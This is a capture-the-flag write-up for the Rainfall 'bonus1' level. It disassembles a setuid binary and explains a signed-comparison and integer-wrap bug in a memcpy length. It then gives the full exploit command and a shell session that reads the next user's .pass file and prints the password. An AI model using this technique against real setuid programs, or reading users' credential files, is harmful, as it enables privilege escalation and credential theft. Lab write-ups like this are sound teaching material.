# Rainfall

## Bonus1

```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482d4  _init
0x08048320  memcpy
0x08048320  memcpy@plt
0x08048330  __gmon_start__
0x08048330  __gmon_start__@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  execl
0x08048350  execl@plt
0x08048360  atoi
0x08048360  atoi@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048424  main # <---------- only 1 function
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini
(gdb) 
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:     push   %ebp
   0x08048425 <+1>:     mov    %esp,%ebp
   0x08048427 <+3>:     and    $0xfffffff0,%esp
   0x0804842a <+6>:     sub    $0x40,%esp
   0x0804842d <+9>:     mov    0xc(%ebp),%eax              # argv
   0x08048430 <+12>:    add    $0x4,%eax
   0x08048433 <+15>:    mov    (%eax),%eax                 # argv[1]
   0x08048435 <+17>:    mov    %eax,(%esp)
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>        # atoi(argv[1])
   0x0804843d <+25>:    mov    %eax,0x3c(%esp)             # n
   0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:    jle    0x804844f <main+43>         # if (n <= 9)  SIGNED
   0x08048448 <+36>:    mov    $0x1,%eax
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>        # return 1
   0x0804844f <+43>:    mov    0x3c(%esp),%eax
   0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx           # size = n * 4
   0x0804845a <+54>:    mov    0xc(%ebp),%eax
   0x0804845d <+57>:    add    $0x8,%eax
   0x08048460 <+60>:    mov    (%eax),%eax                 # argv[2]
   0x08048462 <+62>:    mov    %eax,%edx
   0x08048464 <+64>:    lea    0x14(%esp),%eax             # buf
   0x08048468 <+68>:    mov    %ecx,0x8(%esp)
   0x0804846c <+72>:    mov    %edx,0x4(%esp)
   0x08048470 <+76>:    mov    %eax,(%esp)
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>      # memcpy(buf, argv[2], n*4)
   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)      # n == "FLOW" ?
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    movl   $0x0,0x8(%esp)
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:   movl   $0x8048583,(%esp)
   0x08048499 <+117>:   call   0x8048350 <execl@plt>       # execl("/bin/sh", ...)
   0x0804849e <+122>:   mov    $0x0,%eax
   0x080484a3 <+127>:   leave
   0x080484a4 <+128>:   ret
End of assembler dump.
```

`atoi(argv[1])` → n

if n > 9 (signed) → exit

`memcpy(buf, argv[2], n * 4)`

if n == 0x574f4c46 ("FLOW") → execl("/bin/sh")
`buf` at `esp+0x14`, `n` at `esp+0x3c` → 40 bytes between them.
We must write 40 dummy bytes + "FLOW" over `n`.

That is a 44-byte memcpy.

`n * 4` is a 32-bit value. It wraps every 2³².

Dividing by 4: you can subtract 2³² / 4 = 1073741824 from `n` and `n * 4` stays 44.

```sh
11 - 1073741824 = -1073741813
```
```sh
-1073741813 <= 9     # accepted
-1073741813 * 4      # wraps to 44
```

```sh
./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```

```
argv[1]   n that passes the check and copies 44 bytes
A*40      fill buf
FLOW      overwrite n  (\x46\x4c\x4f\x57 = 0x574f4c46)
```

```sh
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```